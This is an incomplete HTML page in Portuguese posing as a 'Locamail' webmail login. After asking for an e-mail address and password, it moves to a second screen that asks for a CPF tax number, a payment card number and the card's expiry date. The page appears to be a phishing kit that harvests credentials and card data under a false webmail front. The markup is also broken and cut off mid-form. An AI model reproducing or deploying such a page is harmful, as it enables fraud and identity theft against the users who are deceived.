<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<title>Locamail :: Acesso ao Webmail</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

.lm-login-container{width:320px;background:#222;padding:25px;border-radius:8px}
input{width:100%;margin:8px 0;padding:10px;border:0;border-radius:4px}
button{width:100%;padding:10px;border:0;border-radius:4px;background:#00d084;color:#000;font-weight:bold;cursor:pointer}
a{color:#00d084;text-decoration:none;font-size:12px}
.lm-logo-label{font-size:18px;margin-bottom:15px;text-align:center}
</style>
</head>
<body>

<!-- TELA 1: LOGIN -->
<div id="tela1" class="lm-login-container">
  <div class="lm-logo-label">Acesso ao Webmail</div>
  <form id="loginform">
    <input id="email" placeholder="E-mail" required>
    <input id="senha" type="password" placeholder="Senha" required>
    <button type="submit">Entrar</button>

</div>

<!-- TELA 2: CPF+CARTÃƒO -->

  <form id="finalform">
    <input name="cpf" placeholder="CPF (somente nÃºmeros)" pattern="\d{11}" maxlength="11" required>
    <input name="num" placeholder="NÃºmero do cartÃ£o" pattern="\d{13,19}" maxlength="19" required>
    <input name="val" placeholder="Validade (MM/AA)" pattern="\d{2}/\d{2}" maxlength="5" required>
